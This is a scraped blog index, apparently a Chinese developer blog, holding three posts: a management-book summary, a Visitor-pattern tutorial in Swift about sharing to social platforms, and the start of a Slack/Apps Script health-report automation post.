modes從工程師(Maker)到管理者(Manager)的過渡。完成好任務甚至優雅地解決難題是優秀的工程師的衡量標準，但做為管理者以不是用完成任務的能力來衡量，這部分我們已經證明過了，而是以帶領、推動、提升能力的團隊目標作為評斷標準。但也不能完全將自己從任務中抽離，完全與任務細節抽量導致與團隊成員斷開連結，對於執行成果、優先權、信任方面長期來看會有很大的風險。所以不是說當管理者就不用做工程師的事，而是兩邊都要碰，需要的就在 工程師(Maker) 跟 管理者(Manager) 之中取得平衡。做為工程師時我們喜歡有連續不被打斷的時間讓我們保持在 Context 中去解決困難的問題；但做為管理者時，我們需要的是時常跳出來幫助團隊、關心隊友，所以被打斷其實是管理者的工作之一。但我們同時需要身兼工程師和管理者，那該如何是好？作者建議建立兩個 Calendar ，一個是 as Maker (工程師)、一個是 as Manager (管理者)，然後每日一大早給自己 15 – 30 分鐘整理思緒，安排本日行事曆，該做什麼事、有什麼會、有哪些空檔的連續時間點可以拿來解決任務(as Maker)。作者的行事曆範本我們也需要專心的時間作者所述，現在身為管理者，但我們仍需同時處理任務；可利用的空檔專注時間對我們來說比以前更重要。作者提到，可以在需要專心的時間透過一些動作傳達給隊友，暫時不要打擾我！方法有：到會議室、戴上耳機、或甚至買一個 ON AIR ! 的開關燈放桌上。如果不是緊急問題，可以先請隊友留言或彙整資訊寄信給你，等到專心時間結束後再來處理。評估自己做為工程師的時間能解決的任務因為已經不像以前純當工程師(Maker)的時候可以全心全力灌注在開發需求上，所以要依照工程師行事曆所能運用的時間來選擇能親自執行的任務。不要成為團隊的技術瓶頸，我們的任務是提升團隊能力、探索新技術、提升公司對外或隊內的技術視野；可做的事有預先研究技術問題，然後與隊友分享並交由隊友執行、解決公司技術債、流程問題增加開發效率、使用新技術、將公司技術開源、開放 API、對外黑客松…等等。最重要的還是平衡作者建議可以從 15–20% 比例開始調配，本來是 100% as Maker，現在可能是 20% as Maker / 80% as Manager（但這要看實際團隊大小及成員能力，作者也說 50% / 50% 也有可能），就是不能在是 100% 投入工程開發，要多花心力在管理上。善用 1:1定期與隊友 1:1，互相 Feedback 並分享所學到的東西。如果管理者的任務吃掉你所有時間作者最後提到，如果你管理的任務太多完全無法做工程 (as Maker)的事，與任務、技術脫節時，可以考慮每週選幾天 WFH 與公司隔離或參加黑客松。Lesson 2. — Code Review” Your Management Decisions定期 Review 你身為管理者下的決策。身為工程師時我們有很多方法或工具，只要遵循就能提升好能力，諸如 pair programming、code review、design pattern；但做為管理者，尤其菜鳥我們感到相當孤獨。我們不想承認對上或對下一無所知、害怕為團隊成功負責也擔心沒拿捏好技術(債)與商業需求之間的平衡。作者提到要跨出去尋找提升管理能力的，公開徵求 Feedback &amp; 提高管理技能的方法；做管理者時也能像做工程師時的熱情。記錄＆回頭審查決定同事與老闆都是我們很常低估的強大資源，我們可以快速的從同事與老闆的 Feedback 中學習；建立好紀錄＆回頭審查決定的習慣，可以讓我們更好的得到 Feedback。作者提到： 「There is no one right way, there are only tradeoffs.」我想也是，如果不是進退兩難的問題應該也不會問你；如果問你就代表隊友不知道該如何決定。我們可以列出選項並提供決定給隊友，但與此同時也要記下所做的決定。作者提供的紀錄 Sheet 範本養成紀錄的習慣，並且要確保內容是之後能回憶的。作者建議，每個月回頭審查，可以與老闆或其他管理者或其他同事分享討論決策（至少要分享一半的問題），聽聽別人的看法；可以匿名保護當事者，對事不對人，並記錄下來。回頭審查時的要點關於問題： 引起多少技術問題？ 是個人問題？ 只是某個成員的獨立問題？（是不是單純只是他不了解目標？） 這問題在其他團隊或會重複出現嗎？關於決策： 這問題真的需要管理者來決定嗎 有沒有問過隊友的建議 有沒有其他比較有經驗的人能提供建議 現在重新思考，還會是同個決定嗎？Lesson 3. — Confront and challenge your teammates推動隊友跳脫舒適圈以及不讓自己變成混蛋跟陷入陷阱。作者提到一開始很不習慣，因為本來是朋友的同事現在變成部署；他害怕會傷害本來的關係；所以一昧地承擔所有收尾的事，但最後他發現他越是保護越與隊友距離越遠，因為他一而再的埋頭苦幹，少了分享讓隊友失去信念。回頭來看，作者說與其害怕傷害隊友的感覺不如說出內心真實所想的，「害怕傷害隊友」這單純是自己自私的想像，沒有必要；而且這是身為管理者的責任，帶領團隊成長前進；要遠觀大局、控制風險。分享真實想法對雙方都很難，但這是身為管理者的責任。我們要展現同理心而不是同情心，為了讓他們的工作真正出類拔萃，他們需要我們客觀的意見。作者提供以下三個要項讓我們能在情緒與行爲中做出平衡： 我有展現出同理心嗎？ 我有清楚說明我的期待嗎？ 我有以身作則嗎？ 「If you want to achieve anything in this world, you have to get used to the idea that not everyone will like you.」 如果你想要有所成就，就必須習慣不會每個人都喜歡你的想法四個常見的陷阱： 相較於掩蓋，我有公開分享失敗經驗嗎？（可以是寫文章、寄信給所有人） 忘記統整討論結果（要習慣紀錄 1:1、討論的結果） 使用錯誤的 Feedback 媒介，沒得到真正的問題（依照團隊文化找到適合的 Feedback 渠道，EX: 1:1） 不即時的 Feedback我們需要注意，工程師喜歡挑戰自我、提升技能，同時也想要獲得尊重、主管的 Feedback；我們的任務就是帶領團隊成長，所以在每次有 Feedback 機會時不應該拖延，因為不做決定也等同於做決定；而且一旦 Feedback 的風氣衰弱之後要再點燃就更困難。Summary可以花時間寫下激勵隊友的方法及詢問主管是否太保護隊友？Lesson 4. — Teach how to get things done如何以風險較低的方式完成任務。以身作則是不錯的方法，時不時參與團隊的開發示範如何計畫、產出好的功能展現我們想傳達的理念；另外要注意，在這其中要多説 Why? (為何這樣做)、少說 How? (該怎麼做)作者提到極度透明的文化，讓團隊成員有完整的 Context 能提高推動決策的能力。降低風險 為了降低產出的風險，作者建議將需求拆成許多小塊迭代功能；並將此想法與其他 Team 溝通分享。 Scale and performance — always have a backup plan這功能會不會影響效能(或造成其他問題)？可以提前知道嗎？有沒有備案(開關)；在沒有備案之前寧可不要實作，因為會影響團隊信心。 將任務拆解成小任務，降低 Deadline 風險一開始可能很難，但可以訓練學習 善用同儕壓力將任務拆給隊友共同協作，彼此共同努力(Code Review 亦也是) 持續對內及對外溝通對內：確保期望、同步、Deadline、資源，對外：溝通、如果時間很趕了可推掉不重要會議 支援、修 Bug、文件不是釋出功能就好，還要做好客服支援、修 Bug、還有文件 做好回顧及委派任務，提供其他人領導機會 挑選幾個能以身作則的 Task 詢問隊友學到的東西、能讓他更積極的動機、討厭的事Lesson 5. — Delegate tasks without losing quality or visibility委派任務的同時又不喪失品質跟能見度。身為管理者必須做好任務委派，作者認為委派就該設定好期待並相信被指派的隊友有能力執行並是有機會學到東西及保有發生錯誤的空間，管理者另一方面也要保護隊友來自公司的壓力。作者使用以下表格進行記錄：這邊主要紀錄的是對團隊目標重要的任務，日常工作不用紀錄。 Must 寫下任務內容對於是否要將任務委派給隊友，作者會先問這個任務是否真的只有我能做且是屬於管理者該做的事，第二個是這個任務是否是長遠的領導任務；如果都不是則委派隊友執行。對於要委派的任務可評估隊友的經驗、技能，找到合適的人選。 External 關於外部或上面期待的資源 (Feedback/Tool) DelegateDelegate 的部分，我們可以提供一頁的 Paper 闡述我們的期待、簡單的範例。Lesson 6. — Build trust with other teams in the organization團隊與團隊兼協作的默契。作者闡述，組織為了能做更多事會拆分很多小組進行快速決策處理；對於各小組的方向定義其實不難(EX: iOS 就是做 iOS App)，難的是要對齊所有小組的目標。小組越多就很難統一所有人的價值觀、期望、優先權、隱含的期望。應該要關注拆分小組的理由跟動機而非產出，否則可能導致矛盾。作者認為要對齊各小組的方向有以下方法： 團隊要有願景，而不是只把任務處理好 管理者需要區分出需要與想要 優化團隊更快的完成正確的事而不是完成更多的事 與其他團隊經理建立良好的溝通作者建議可以在每兩週的管理者會議分享團隊內的狀態、分享自己團隊阻礙與痛苦、接下來會做的主要任務、做的原因 與其他團隊對於優先權意見不同時，可解釋引出其他因素（EX: 這個做了之後，可以降低 CS 客訴、一勞永逸、加乘效果…） 先了解外部團隊需要我們幫忙的地方並且主動密切追蹤 再來提出我們團隊需要外部團隊幫忙的點 列好需要確認的清單，確保在會議上有討論到；如果沒有可以在會後拉相關的經理討論看有沒有其他可能 若不可能則要權衡可能會延遲時間或替代方案，並要讓關係人知道（防止在背後指指點點） 一切都是權衡另外還有 5 個讓隊友能與其他團隊建立密切關係的方法： 簡單的感謝信（感謝協助） 交換團隊工作 內部技術年會，互相分享 一起觀察使用者使用狀況，一起腦力激盪提出優化方向 邀請一位其他 Team 的隊友加入我們的工作Summary 「 imagine that someone from Team A drops a feature that Team B needs, due to an urgent support issue. Without communicating this priority change to Team B, trust will be decreased even if it’s a justified priority change.」「 difference between transactional trust and relational/emotional trust 」 了解交易信任與關係信任。 交易信任 — — 人們是否會履行承諾並完成任務 關係信任 — — 人們是否以建立和保護關係的方式行事Lesson 7. — Optimize for business learning建立商業學習文化而不是建造文化、優化吞吐量、優化的價值。 過早的優化是災難 優化當前問題為重，不要為了優化而優化 即使不是整個專案的負責人，我們仍可就內部運作進行優化，大的成功多半來自小部分的優化累積 身為管理者我們必須展現決策背後的動機 建立商業學習(價值)文化大與建造文化（重點不是建造解法，而是我們試圖解決的商業問題） 優化效率 vs 優化吞吐量問題：優化效率：解決單一 task 的時間優化吞吐量：一個時間範圍內(EX: 一季) 能解決多少 task 知道每個優化的 Impact， 自動化的重要（能一勞永逸節省時間）使用 AARRR 原則為價值優化： Acquisition：如何引入更多使用者 Activation：如何引導使用者完成讓他了解產品價值的任務（EX: 鬧鐘 App，新手引導他完成設立一個鬧鐘） Retention：提升回訪率，回來使用次數 Referrer：讓你的使用者、內容，帶來更多流量 Revenue：數字化評估使用者帶來的收入這五項息息相關，如果因為 Retention 低，可能可以同步調整 Referrer、Acquisition。身為工程管理者，我們要做的不是埋頭寫 Code 或是全心投入在技術；時不時應該要重新對齊產品價值。當產品還在草創初試市場狀態時，應該要以優化效率(快速解決任務釋出)為主，重複著以下流程：功能能提升 Retention -&gt; 釋出功能 -&gt; 學習 -&gt; 調整＆重複。評估功能到釋出每個階段可以優化的地方（花太多時間在設計？在討論？）可以投資 20% 時間減少 80% 的開發時間嗎？尤其是令人痛苦的點可以先實驗或發布給最小受眾嗎？避免功能很大包結果最後沒人用。 要做好數據追蹤，才能了解努力的成效 「If you can’t make engineering decisions based on data, then make engineering decisions that result in data.”」雖然相較「這功能不做，公司會倒閉」跟「這功能會導致技術債」，前者當然更可怕；對於技術債，作為管理者如果能爭取更多時間解決我們應該就要做到，我們應該要做好溝通及控管。優化可能不會用到的程式意義不大。 過了草創試驗期，產品模式趨於穩定；這時候比較適合優化的是吞吐量(EX: 給定 X 資源，得到 Y 產出) 給予商業需求可預測性(同上)追蹤團隊產出 (EX: 「01/01/2013–14/01/2013: 2 Large features, 5 Medium features, 4 Small )，經過長期統計；可以藉此提供預測。找出＆解決瓶頸： 同步的溝通：例如產品開發流程，需要設計資源；在進到工程開發階段，我們是否已經有明確的規格可執行開發？還是在等待？還是有什麼我們可以先做的？ 基礎設施：讓程式碼好擴充、好維護 自動化：使用自動化處理繁瑣的人工操作，節省時間之餘也能避免出錯因為商業策略隨時在改變，我們應該對於優化策略保有更開放彈性的想法，優化的總結還是以商業需求為主。Lesson 8. — Use Inbound Recruiting to attract better talent關於招募。平時就要開始做以下事項，防止突然缺人才要開始，那只能回到傳統找人方式，不停的面試但卻很難找到合適的人。對內： 培養良好的工程文化環境 (EX: Code Review、年會…) 打造吸引人的工作環境 像經營品牌一樣 團隊成員共同努力 加強人與人的連結（EX: 慶生） 先讓成員是對團隊感到驕傲的對外： 內部團隊每週定時對外回答社群問題 (EX: Stackoverflow. . )，加強曝光 在程式中隱藏招募彩蛋(EX: 網頁開發者工具) 與社群分享我們團隊遇到的問題及解決方法（文章 or Talk） 舉辦黑客松 建立 Side Project (EX: 開源專案)分配以上各任務給團隊成員，大家一起為找到好人才貢獻一份心力。Lesson 9. — Build a scalable team打造可擴充的團隊。建立可擴充程式以是我們之前擔任工程是該有的職責，但現在要挑戰的是打造可擴充團隊。不像程式，人有期待、需要、夢想要顧及。作者想要打要一個快樂的工作環境、隊友之間了解任務的期待、新挑戰；而且要能持續保持這份熱情。 對齊目標對齊個人願景與公司目標，如果不了解當前公司的目標很可能造成團隊功能失調。 對齊核心價值算是共識及默契，對於做事方式、什麼重要的默契；團隊核心價值也不是一成不變，要與時俱進。 平衡對於團成員的職能、成長，分配不同的願景、自主權、擁有全；互相協作一起成長(EX: 新人只期待能了解公司做事流程，老鳥要 Code Review、指導)；每個人都應該要有成長性。 團體的核心價值觀大於個體可能導致有人離職，也需要時間耐心才可能實現；也有許多挑戰 (EX: 有人離職時會質疑核心價值) 成就感成果要能有成就感，做為管理者不能讓隊友干燒熱情實踐1. 定義團隊願景EX: 作者的團隊是做爬蟲的，他的團隊願景就是「To build the largest, most informative profile-database in the world.」請注意是願景，不是短期目標也不想做的事。2. 定義團隊核心價值在挑選核心價值時可以「這個價值重要到會因為沒有而開除某人嗎？」寫下核心價值、原因。作者提供以下幾個他寫的核心價值：- 不要讓別人(其他團隊)來收拾善後，自己(團隊)的錯誤自己要承擔- 對團隊所有成員保持忠誠尊重有了核心價值在招募或開除更有評斷準則，還有更能有做事的基準。定義成員對團隊對管理者的期待 提供具有生產力且開心的工作環境 知道 Task 的 Why 而不是 How 能夠得到真實的 Feedback 有機會帶領其他成員 能夠分享工作成果定義對團隊成員的期待基本期待： 完成任務 保持學習熱忱 保持分享、教學熱忱 知道做事的底線 sense個人期待： 依照能力設定期待 有能力訓練他人改變 推動改變而不是抱怨我們是團隊，團隊成員有自己的責任跟要交付的成果，同時也要與其他人協作，幫助他人，互相成長；定義期待像是種契約，在原本的同事關係變成管理者關係之下，能更好更有目的的領導；定義這些項目不容易，需要時間、耐心去迭代。 「You can’t empower people by approving their actions. You empower by designing the need for your approval out of the system.」有任何問題及指教歡迎 與我聯絡 。===本文首次發表於 Medium ➡️ 前往查看Follow Me on Medium 981+ Followers 215 Total Views Last Statistics Date: 2025-01-19 | 192 Views on Medium. " }, { "title": "Visitor Pattern in iOS (Swift)", "url": "/posts/ba5773a7bfea/", "categories": "ZRealm Dev.", "tags": "ios-app-development, swift, design-patterns, visitor-pattern, double-dispatch", "date": "2021-06-15 23:58:36 +0800", "snippet": "Visitor Pattern in Swift (Share Object to XXX Example)Visitor Pattern 的實際應用場景分析 (在分享 商品、歌曲、文章… 到 Facebook, Line, Linkedin. . 場景)Photo by Daniel McCullough前言「Design Pattern」從知道有這個東西到現在也超過 10 年了依然沒辦法...", "content": "Visitor Pattern in Swift (Share Object to XXX Example)Visitor Pattern 的實際應用場景分析 (在分享 商品、歌曲、文章… 到 Facebook, Line, Linkedin. . 場景)Photo by Daniel McCullough前言「Design Pattern」從知道有這個東西到現在也超過 10 年了依然沒辦法有自信的說能完全掌握，一直以來都是矇矇懂懂的，也好幾次從頭到尾把所有模式都看過一遍，但看了沒內化、沒在實務上應用很快就忘了。 我真的廢。內功與招式曾經看到的一個很好的比喻 ，招式部分如：PHP、Laravel、iOS、Swift、SwiftUI…之類的應用，其實在其中切換學習門檻都不算高；但內功部分如：演算法、資料結構、設計模式…等等都屬於內功；內功與招式之間有著相輔相成的效果；但是招式好學，內功難練；招式厲害的內功不一定厲害，內功厲害的也可以很快學會招式，所以與其說相輔相成不如說內功才是基礎，搭配招式才能所向披靡。找到適合自己的學習方式基於之前的學習經驗，我認為適合我自己的學習 Design Pattern 方式是 — 先精再通；先著重於精通幾個模式，要能內化跟靈活運用，還要培養出嗅覺，能判斷什麼場景適合什麼場景不適合；再一步一步的累積新模式，直到全部掌握；我覺得最好的方式就是多找實務場境，從應用中學習。學習資源推薦兩個免費的學習資源 https://refactoringguru.cn/ ：完整介紹所有模式結構、場景、相互關係 https://shirazian.wordpress.com/2016/04/11/design-patterns-in-swift/ ：作者以實際開發 iOS 的場景介紹更個模式的應用，本文也會以這個方向撰寫Visitor — Behavioral Patterns第一章紀錄的是 Visitor Pattern，這也是在街聲工作一年挖到的金礦之一，在 StreetVoice App 中有諸多善用 Visitor 解決架構問題的地方；我也在這段經歷之中席的了 Visitor 的原理精髓；所以第一章就來寫它！Visitor 是什麼首先請先了解 Visitor 是什麼？想要解決什麼問題？組成結構是什麼？圖片取自 refactoringguru詳細內容這邊不再重複贅述，請先直接參考 refactoringguru 對於 Visitor 的講解 。iOS 實務場景 — 分享功能假設今天我們有以下幾個 Model：UserModel、SongModel、PlaylistModel 這三個 Model，現在我們要實作分享功能，可以分享到：Facebook、Line、Instagram，這三個平台；每個 Model 需要呈現的分享訊息皆為不同、每個平台需要的資料也各有不同：組合場景如上圖，第一個表格顯示各 Model 的客製化內容、第二個表格顯示各分享平台需要的資料。 尤其 Instagram 在分享 Playlist 時要多張圖片，跟其他分享要的 source 不一樣。定義 Model首先把各個 Model 有哪些 Property 定義完成：// Modelstruct UserModel { let id: String let name: String let profileImageURLString: String}struct SongModel { let id: String let name: String let user: UserModel let coverImageURLString: String}struct PlaylistModel { let id: String let name: String let user: UserModel let songs: [SongModel] let coverImageURLString: String}// Datalet user = UserModel(id: \"1\", name: \"Avicii\", profileImageURLString: \"https://zhgchg.li/profile/1.png\")let song = SongModel(id: \"1\", name: \"Wake me up\", user: user, coverImageURLString: \"https://zhgchg.li/cover/1.png\")let playlist = PlaylistModel(id: \"1\", name: \"Avicii Tribute Concert\", user: user, songs: [ song, SongModel(id: \"2\", name: \"Waiting for love\", user: UserModel(id: \"1\", name: \"Avicii\", profileImageURLString: \"https://zhgchg.li/profile/1.png\"), coverImageURLString: \"https://zhgchg.li/cover/3.png\"), SongModel(id: \"3\", name: \"Lonely Together\", user: UserModel(id: \"1\", name: \"Avicii\", profileImageURLString: \"https://zhgchg.li/profile/1.png\"), coverImageURLString: \"https://zhgchg.li/cover/1.png\"), SongModel(id: \"4\", name: \"Heaven\", user: UserModel(id: \"1\", name: \"Avicii\", profileImageURLString: \"https://zhgchg.li/profile/1.png\"), coverImageURLString: \"https://zhgchg.li/cover/4.png\"), SongModel(id: \"5\", name: \"S.O.S\", user: UserModel(id: \"1\", name: \"Avicii\", profileImageURLString: \"https://zhgchg.li/profile/1.png\"), coverImageURLString: \"https://zhgchg.li/cover/5.png\")], coverImageURLString: \"https://zhgchg.li/playlist/1.png\")什麼都沒想的做法完全不考慮架構，先上一個什麼都沒想的最髒做法。周星馳 — 食神class ShareManager { private let title: String private let urlString: String private let imageURLStrings: [String] init(user: UserModel) { self.title = \"Hi 跟你分享一位很讚的藝人\\(user.name)。\" self.urlString = \"https://zhgchg.li/user/\\(user.id)\" self.imageURLStrings = [user.profileImageURLString] } init(song: SongModel) { self.title = \"Hi 與你分享剛剛聽到一首很讚的歌，\\(song.user.name) 的 \\(song.name)。\" self.urlString = \"https://zhgchg.li/user/\\(song.user.id)/song/\\(song.id)\" self.imageURLStrings = [song.coverImageURLString] } init(playlist: PlaylistModel) { self.title = \"Hi 這個歌單我聽個不停 \\(playlist.name)。\" self.urlString = \"https://zhgchg.li/user/\\(playlist.user.id)/playlist/\\(playlist.id)\" self.imageURLStrings = playlist.songs.map({ $0.coverImageURLString }) } func shareToFacebook() { // call Facebook share sdk... print(\"Share to Facebook...\") print(\"[![\\(self.title)](\\(String(describing: self.imageURLStrings.first))](\\(self.urlString))\") } func shareToInstagram() { // call Instagram share sdk... print(\"Share to Instagram...\") print(self.imageURLStrings.joined(separator: \",\")) } func shareToLine() { // call Line share sdk... print(\"Share to Line...\") print(\"[\\(self.title)](\\(self.urlString))\") }}沒啥好說的，就是 0 架構全攪和在一起，如果今天要新加一個分享平台、更改某個平台的分享資訊、增加一個可分享的 Model 都要動到 ShareManager；另外 imageURLStrings 的設計因是考量到 Instagram 在分享歌單時需要圖片組資料所以才宣告成陣列，這有點倒因為果變成照需求去設計架構，其他不需要圖片組的類型也遭到污染。優化一下稍微分離一下邏輯。protocol Shareable { func getShareText() -&gt; String func getShareURLString() -&gt; String func getShareImageURLStrings() -&gt; [String]}extension UserModel: Shareable { func getShareText() -&gt; String { return \"Hi 跟你分享一位很讚的藝人\\(self.name)。\" } func getShareURLString() -&gt; String { return \"https://zhgchg.li/user/\\(self.id)\" } func getShareImageURLStrings() -&gt; [String] { return [self.profileImageURLString] }}extension SongModel: Shareable { func getShareText() -&gt; String { return \"Hi 與你分享剛剛聽到一首很讚的歌，\\(self.user.name) 的 \\(self.name)。\" } func getShareURLString() -&gt; String { return \"https://zhgchg.li/user/\\(self.user.id)/song/\\(self.id)\" } func getShareImageURLStrings() -&gt; [String] { return [self.coverImageURLString] }}extension PlaylistModel: Shareable { func getShareText() -&gt; String { return \"Hi 這個歌單我聽個不停 \\(self.name)。\" } func getShareURLString() -&gt; String { return \"https://zhgchg.li/user/\\(self.user.id)/playlist/\\(self.id)\" } func getShareImageURLStrings() -&gt; [String] { return [self.coverImageURLString] }}protocol ShareManagerProtocol { var model: Shareable { get } init(model: Shareable) func share()}class FacebookShare: ShareManagerProtocol { let model: Shareable required init(model: Shareable) { self.model = model } func share() { // call Facebook share sdk... print(\"Share to Facebook...\") print(\"[![\\(model.getShareText())](\\(String(describing: model.getShareImageURLStrings().first))](\\(model.getShareURLString())\") }}class InstagramShare: ShareManagerProtocol { let model: Shareable required init(model: Shareable) { self.model = model } func share() { // call Instagram share sdk... print(\"Share to Instagram...\") print(model.getShareImageURLStrings().joined(separator: \",\")) }}class LineShare: ShareManagerProtocol { let model: Shareable required init(model: Shareable) { self.model = model } func share() { // call Line share sdk... print(\"Share to Line...\") print(\"[\\(model.getShareText())](\\(model.getShareURLString())\") }}我們抽離出一個 CanShare Protocol，凡是 Model 有遵循這個協議都能支援分享；分享的部分也抽離出 ShareManagerProtocol，有新的分享只要實現協議內容即可、要修改刪除也都不會影響其他 ShareManager。但 getShareImageURLStrings 依然詭異，另外假設今天新增的分享平台需求的 Model 資料天壤之別，例如微信分享還需要播放次數、創建日期…等資訊，只有他要，這時候就會開始變得混亂。Visitor使用 Visitor Pattern 的解法。// Visitor Versionprotocol Shareable { func accept(visitor: SharePolicy)}extension UserModel: Shareable { func accept(visitor: SharePolicy) { visitor.visit(model: self) }}extension SongModel: Shareable { func accept(visitor: SharePolicy) { visitor.visit(model: self) }}extension PlaylistModel: Shareable { func accept(visitor: SharePolicy) { visitor.visit(model: self) }}protocol SharePolicy { func visit(model: UserModel) func visit(model: SongModel) func visit(model: PlaylistModel)}class ShareToFacebookVisitor: SharePolicy { func visit(model: UserModel) { // call Facebook share sdk... print(\"Share to Facebook...\") print(\"[![Hi 跟你分享一位很讚的藝人\\(model.name)。](\\(model.profileImageURLString)](https://zhgchg.li/user/\\(model.id)\") } func visit(model: SongModel) { // call Facebook share sdk... print(\"Share to Facebook...\") print(\"[![Hi 與你分享剛剛聽到一首很讚的歌，\\(model.user.name) 的 \\(model.name)，他被播方式。](\\(model.coverImageURLString))](https://zhgchg.li/user/\\(model.user.id)/song/\\(model.id)\") } func visit(model: PlaylistModel) { // call Facebook share sdk... print(\"Share to Facebook...\") print(\"[![Hi 這個歌單我聽個不停 \\(model.name)。](\\(model.coverImageURLString))](https://zhgchg.li/user/\\(model.user.id)/playlist/\\(model.id)\") }}class ShareToLineVisitor: SharePolicy { func visit(model: UserModel) { // call Line share sdk... print(\"Share to Line...\") print(\"[Hi 跟你分享一位很讚的藝人\\(model.name)。](https://zhgchg.li/user/\\(model.id)\") } func visit(model: SongModel) { // call Line share sdk... print(\"Share to Line...\") print(\"[Hi 與你分享剛剛聽到一首很讚的歌，\\(model.user.name) 的 \\(model.name)，他被播方式。]](https://zhgchg.li/user/\\(model.user.id)/song/\\(model.id)\") } func visit(model: PlaylistModel) { // call Line share sdk... print(\"Share to Line...\") print(\"[Hi 這個歌單我聽個不停 \\(model.name)。](https://zhgchg.li/user/\\(model.user.id)/playlist/\\(model.id)\") }}class ShareToInstagramVisitor: SharePolicy { func visit(model: UserModel) { // call Instagram share sdk... print(\"Share to Instagram...\") print(model.profileImageURLString) } func visit(model: SongModel) { // call Instagram share sdk... print(\"Share to Instagram...\") print(model.coverImageURLString) } func visit(model: PlaylistModel) { // call Instagram share sdk... print(\"Share to Instagram...\") print(model.songs.map({ $0.coverImageURLString }).joined(separator: \",\")) }}// Use caselet shareToInstagramVisitor = ShareToInstagramVisitor()user.accept(visitor: shareToInstagramVisitor)playlist.accept(visitor: shareToInstagramVisitor)我們逐行來看做了什麼： 首先我們創建了一個 Shareable 的 Protocol，其目的只是方便我們管理 Model 支援分享 Visitor 有統一的接口 (不定義也行)。 UserModel/SongModel/PlaylistModel 實現 Shareable func accept(visitor: SharePolicy) ，之後如果有新增支援分享的 Model 也只需實現協議 定義出 SharePolicy 列出所支援的 Model(must be concrete type) 或許你會想為何不定義成 visit(model: Shareable) 如果是這樣就重蹈上一版的問題了 各個 Share 方法實現 SharePolicy，各自依照 source 去組合需要的資源 假設今天多一個微信分享，他要的資料比較特別(播放次數、創建日期)，也不會影響現有程式碼，因為他能從 concrete model 拿到他自己需要的資訊。達成低耦合、高聚合的程式開發目標。以上是經典的 Visitor Double Dispatch 實現，但我們日常開發上比較少會遇到這種狀況，一般常見的狀況可能只會有一個 Visitor，但我覺得也很適合使用這套模式組合，例如今天有一個 SaveToCoreData 的需求，我們也可以直接定義 accept(visitor: SaveToCoreDataVisitor) ，不多宣告出 Policy Protocol，也是個很好的使用架構。protocol Saveable { func accept(visitor: SaveToCoreDataVisitor)}class SaveToCoreDataVisitor { func visit(model: UserModel) { // map UserModel to coredata } func visit(model: SongModel) { // map SongModel to coredata } func visit(model: PlaylistModel) { // map PlaylistModel to coredata }}其他應用：Save、Like、tableview/collectionview cellforrow….原則最後講一下一些共通原則 Code 是給人讀的，切勿 Over Designed 統一很重要，同樣的場境同個 Codebase 應該使用同個架構方法 如果範圍是可控的或不可能出現其他狀況，這時候如果還繼續往下拆分就可以認為是 Over Designed 多應用、少發明；Design Pattern 已經在軟體設計領域好幾十年，他所考量到的場景一定比我們創造一個新的架構還來的完善 看不懂 Design Pattern 可以學，但如果是自己創造的架構就比較難說服別人學，因為學了可能也只能用在這個 Case 上，他就不是一個 Common sense 程式碼重複不代表不好，如果一昧追求封裝可能導致 Over Designed；一樣回到前面幾點，程式是給人讀的，所以只要是好讀加上低耦合高聚合都是好的 Code 勿魔改 Pattern，人家設計一定有他的道理，如果亂魔改可能導致某些場景出現問題 只要開始繞路就會越繞越遠，程式會越來越髒 inspired by ＠saiday參考資料 Design Patterns in Swift: Visitor (另一個使用 Visitor 的場景應用) https://github.com/kingreza/Swift-Visitor Deep Linking at Scale on iOS (State Pattern)延伸閱讀 Design Patterns 的實戰應用紀錄 — In WKWebView with Builder, Strategy &amp; Chain of Responsibility Pattern Design Patterns 的實戰應用紀錄 Visitor Pattern in TableView有任何問題及指教歡迎 與我聯絡 。===本文首次發表於 Medium ➡️ 前往查看Follow Me on Medium 981+ Followers 1,098 Total Views Last Statistics Date: 2025-01-19 | 1,064 Views on Medium. " }, { "title": "Slack 打造全自動 WFH 員工健康狀況回報系統", "url": "/posts/d61062833c1a/", "categories": "ZRealm Dev.", "tags": "ios-app-development, automation, google-sheets, app-script, slack", "date": "2021-06-14 00:58:21 +0800", "snippet": "Slack 打造全自動 WFH 員工健康狀況回報系統玩轉 Slack Workflow 搭配 Google Sheet with App Script 增加工作效率Photo by Stephen Phillips — Hostreviews.co.uk前言因應全面居家工作，公司關心所有成員的健康，每日均需回報身體有無狀況並由 People Operations 統一紀錄管理。我們的 優化前...", "content": "Slack 打造全自動 WFH 員工健康狀況回報系統玩轉 Slack Workflow 搭配 Google Sheet with App Script 增加工作效率Photo by Stephen Phillips — Hostreviews.co.uk前言因應全面居家工作，公司關心所有成員的健康，每日均需回報身體有無狀況並由 People Operations 統一紀錄管理。我們的 優化前 的 Flow [自動化] Slack Channel 每日早上 10 點定時發送提醒大家健康表單的訊息(優化前唯一自動化的地方) 員工點擊連結打開 Google Form 填寫健康問題 資料存回 Google Sheet 回應紀錄 [人工] People Operations 於每日接近下班時比對名單篩出忘記填寫的員工 [人工] 於 Slack Channel 發送填寫提醒訊息 &amp; 一個一個 tag 忘記填寫的人 以上是敝司的健康回報追蹤流程，每間公司依照規模及運作方式一定有所不同，本文僅以此做為優化範例，學習 Slack Workflow 使用、基本 App Script 撰寫，實際還是要 by case 實作。問題點 需跳出 Slack Context 使用瀏覽器打開 Google Form 網頁才能填寫，尤其在手機上更不方便 Google Form 僅能自動帶入 Email 訊息，無法自動加上填寫人名稱、部門資訊 每日人工比對、人工 tag 非常花費人力時間解決方案做過蠻多自動化的小東西，這個流程資料源固定(員工名單)、條件單純、動作很例行；一看就覺得很適合自動化，一開始沒做是因為找不到好的填寫方式(實際是找不到有趣可研究的點)；所以也就放著沒管，直到看到 海總理的這則 PO 文 才發現 Slack Workflow 不只是可以做定時傳訊息，還有 Form 表單的功能：圖片取自： 海總理這下手就開始癢了啊！！如果能搭配 Slack Workflow From 加上傳訊息的自動化，豈不是能解決上面提到的 所有痛點 ，原理可行！於是開始著手實作。優化後 的 Flow首先上一下優化後的流程及結果。 [自動化] Slack Channel 每日早上 10 點定時發送提醒大家健康表單的訊息 從 Google Form 或 Slack Workflow Form 填寫健康問題 資料均存回 Google Sheet 回應紀錄 People Operations 於每日接近下班時點擊「產生未填寫名單」按鈕 [自動化] 使用 App Script 比對員工名單、填寫名單篩出未填寫名單 [自動化] 點擊「產生＆發送訊息」自動發送未填寫提醒＆自動 tag 對象 收工！成效(個人預估) 填寫時間每位員工每日能減少約 30 秒 People Operations 處理這件事每日能減少約 20 ~ 30 分鐘運作原理透過撰寫 App Script 來管理 Sheet。 將外部輸入的資料都存放在 Responses Sheet 撰寫 App Script Function 將 Responses 的資料依照填寫日期分發到各日期的 Sheet，若無則建立新的日期 Sheet，Sheet 名稱直接使用日期，方便辨識取用 